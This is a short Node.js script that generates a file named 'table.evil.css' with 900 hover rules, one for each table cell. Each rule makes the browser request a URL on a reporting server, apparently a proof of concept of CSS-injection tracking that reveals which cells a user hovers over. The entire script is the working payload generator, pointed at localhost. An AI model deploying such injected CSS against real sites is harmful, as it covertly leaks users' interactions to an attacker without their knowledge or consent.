let fs = require("fs");

// td[id=t-0] {
//     background-image: url("http://localhost:3000/report?site=table&type=hover&payload=td[id=t-0]") !important;
// }

function genSingleTdListener(id) {
    return `td[id=${id}]:hover{background-image: url("http://localhost:3000/report?site=table&type=hover&payload=td[id=${id}") !important;}\n`
}

function genAllTdListener(count) {
    let outString = "";
    for (let i = 0; i < count; i++) {
        outString += genSingleTdListener(`t-${i}`);
    }
    fs.writeFileSync("table.evil.css", outString);
}

genAllTdListener(30 * 30);
